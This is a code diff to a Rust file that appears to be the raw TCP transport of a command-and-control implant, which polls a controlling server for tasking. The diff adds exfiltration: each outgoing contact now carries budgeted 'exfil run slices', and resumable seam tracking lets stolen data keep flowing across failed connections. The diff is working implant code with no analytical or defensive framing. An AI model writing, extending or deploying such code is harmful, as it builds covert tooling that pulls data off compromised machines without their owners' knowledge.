@@ -60,22 +60,25 @@ impl RawTcp {
     }
 
     /// The poll shape: one connection is one contact. The request message
-    /// carries the handshake, the staged demands at their current seams, and
-    /// the accumulated batch; the response message carries the handshake
-    /// answer, the staged chunk runs answering those demands, queued tasking,
-    /// and the degraded channel input. The batch leaves only after a
-    /// processed response, so a failed contact re-sends it verbatim on the
-    /// next connection -- a staged transfer's held bytes survive on the
-    /// session and resume.
+    /// carries the handshake, the staged demands at their current seams, the
+    /// accumulated batch, and the exfil run slices the message budget
+    /// admits; the response message carries the handshake answer, the seam
+    /// reports for the slices placed, the staged chunk runs answering those
+    /// demands, queued tasking, and the degraded channel input. The batch
+    /// leaves only after a processed response, so a failed contact re-sends
+    /// it verbatim on the next connection -- a staged transfer's held bytes
+    /// and an exfil run's confirmed seam survive on the session and resume.
     fn attempt_poll(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
         let mut stream = self.connect()?;
         session.drain_channels();
         let demands = session.staged_demands();
         let batch = session.outbox.batch();
-        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len());
+        let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
+        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len() + exfil.len());
         frames.push(session.handshake_frame());
         frames.extend(demands);
         frames.extend(batch.iter().cloned());
+        frames.extend(exfil);
         let (body, _) = session.encode_outgoing(&frames);
         write_message(&mut stream, &body)?;
 
@@ -103,6 +106,7 @@ impl RawTcp {
         super::accept_tasking(session, &inbound[1..], acks);
         session.drain_channels();
         session.staged_cycle_end();
+        session.exfil_cycle_end();
         Ok(Attempt::Crossed)
     }
 
